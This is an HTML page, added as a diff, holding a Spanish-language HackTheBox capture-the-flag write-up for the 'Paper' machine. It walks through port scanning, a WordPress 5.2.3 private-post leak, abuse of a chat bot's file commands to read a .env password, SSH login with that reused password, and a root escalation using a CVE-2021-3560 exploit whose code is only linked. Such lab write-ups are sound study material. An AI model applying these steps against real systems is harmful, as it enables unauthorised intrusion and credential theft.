@@ -1,0 +1,147 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Paper HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/paper.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Paper HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Paper de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Paper de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Paper HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Paper HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Paper de la plataforma de HackTheBox","headline":"Writeup Paper HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Paper HackTheBox</h1>
+          <p>Resolución de la máquina Paper de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2" >❯ nmap</span><span class="p"> 10.10.11.143
+Nmap scan report for 10.10.11.143
+PORT      STATE SERVICE
+22/tcp   open     ssh
+80/tcp   open     http
+443/tcp  open     https</span>
+</code></pre></div></div>
+<div><p>Al mirar las cabeceras de respuesta, encontramos X-Backend-Server con lo que parece un dominio</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2" >❯ curl</span><span class="p"> 10.10.11.143 -I
+HTTP/1.1 403 Forbidden
+Date: Sun, 12 Jun 2022 16:31:50 GMT
+X-Backend-Server: </span></span><span class="kd">office.paper</span>
+</code></pre></div></div>
+<div><p>Si miramos con whatweb las tecnologias que emplea el nuevo dominio encontramos una version de wordpress antigua</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2" >❯ whatweb</span><span class="p"> http://office.paper
+http://office.paper [200 OK]
+Bootstrap[1,5.2.3]
+HTTPServer[CentOS][Apache/2.4.37 (centos)]
+</span></span><span class="kd">WordPress</span></span><span class="p">[</span></span><span class="kd">5.2.3</span></span><span class="p">]
+X-Powered-By[PHP/7.2.24]</span>
+</code></pre></div></div>
+<div><p>Al buscar con searchsploit encontramos 2 exploits para esa versión y hay uno que dice que si agregamos "?static=1" podemos ver post ocultos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2" >❯ searchsploit</span><span class="p"> Wordpress 5.2.3
+------------------------------------------------------------------------ ---------------------------
+ Exploit Title                                                          | Path
+------------------------------------------------------------------------ ---------------------------
+WordPress Core 5.2.3 - Cross-Site Host Modification                     | php/webapps/47361.pl
+WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts | multiple/webapps/47690.md
+------------------------------------------------------------------------ ---------------------------</span>
+<span class="s2" >❯ searchsploit</span><span class="p"> -x 47690.md
+So far we know that adding `</span><span class="kd">?static=1</span><span class="p">` to a wordpress URL should leak its secret content</span>
+</code></pre></div></div>
+<div><p>Lo abrimos en el navegador, y funciona, ahora tenemos un enlace de registro a otro dominio "chat.office.paper"</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">http://chat.office.paper/register/8qozr226AhkCHZdyY</span>
+</code></pre></div></div>
+<div><p><img src="./1.png"><p></div>
+<div><p>Lo agreamos y nos registramos con el enlace que conseguimos</p></div>
+<div><p><img src="./2.png"><p></div>
+<div><p>Despues de unos segundos se nos añade a un grupo aunque no podemos leer, pero podemos ver que hay un bot "recyclops", podemos enviarle mensaje privado</p></div>
+<div><p><img src="./3.png"><p></div>
+<div><p>Al decirle "help" nos da un manual con comandos, podemos usar "list" que es como hacer "ls -la" y "file" que es como hacer "cat", al hacer un "list .." esto es lo que mas destaca</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">list ..
+drwx------ 11 dwight dwight 4096 Jun 12 12:19 .
+-rw-r--r-- 1 dwight dwight 358 Jul 3 2021 .bashrc
+drwx------ 5 dwight dwight 56 Jul 3 2021 .config
+drwx------ 8 dwight dwight 4096 Sep 16 2021 hubot
+drwxr-xr-x 4 dwight dwight   32 Jul  3  2021 sales
+drwx------ 2 dwight dwight 25 Jun 11 22:03 .ssh</span>
+</code></pre></div></div>
+<div><p>"hubot" no es muy comun de ver si miramos que hay dentro entre otras cosas hay un .env podemos revisar que tiene y encontramos credenciales</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">list ../hubot
+drwx------ 8 dwight dwight 4096 Sep 16 2021 .
+drwx--x--x 2 dwight dwight 36 Sep 16 2021 bin
+-rw-r--r-- 1 </span><span class="kd">dwight dwight</span><span class="p"> 258 Sep 16 2021 </span><span class="kd">.env</span><span class="p">
+drwx------ 8 dwight dwight 163 Jul 3 2021 .git
+-rwxr-xr-x 1 dwight dwight 1068 Jul 3 2021 LICENSE
+-rwxr-xr-x 1 dwight dwight 1068 Jul 3 2021 LICENSE
+
+file ../hubot/.env
+export ROCKETCHAT_URL='http://127.0.0.1:48320'
+export ROCKETCHAT_USER=recyclops
+export ROCKETCHAT_PASSWORD=</span><span class="kd">Queenofblad3s!23</span><span class="p">
+export RESPOND_TO_DM=true
+export RESPOND_TO_EDITED=true
+export PORT=8000
+export BIND_ADDRESS=127.0.0.1</span>
+</code></pre></div></div>
+<div><p>Encontramos una contraseña, pero además de eso si miramos el propietario es dwight, entonces podemos probar las credenciales "dwight:Queenofblad3s!23" por ssh y conseguimos el user</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh<span class="p"> dwight@10.10.11.143
+dwight@10.10.11.143's password: </span><span class="kd">Queenofblad3s!23</span><span class="p">
+[dwight@paper ~]$ cat user.txt
+3ec***************************0f5
+[dwight@paper ~]$</span>
+</code></pre></div></div>
+<div><p>Ahora si usamos <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">linpeas</a> para enumerar posibles vectores de ataque, encontramos el CVE-2021-3560 con alta probabilidad</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="na">╔══════════╣ </span><span class="s2">CVEs Check
+</span><span class="p">Vulnerable to </span><span class="kd">CVE-2021-3560</span>
+</code></pre></div></div>
+<div><p>Entonces usando un <a href="https://github.com/GatoGamer1155/CVE-2021-3560">exploit</a> de ese CVE escalamos a root</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">[dwight@paper ~]$ python3 exploit.py 
+ [</span><span class="s2">+</span><span class="p">] Iniciando el exploit 
+ [</span><span class="s2">+</span><span class="p">] Exploit completado 
+[root@paper dwight]# cat /root/root.txt
+555**************************139
+[root@paper dwight]#</span>
+</code></pre></div></div>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
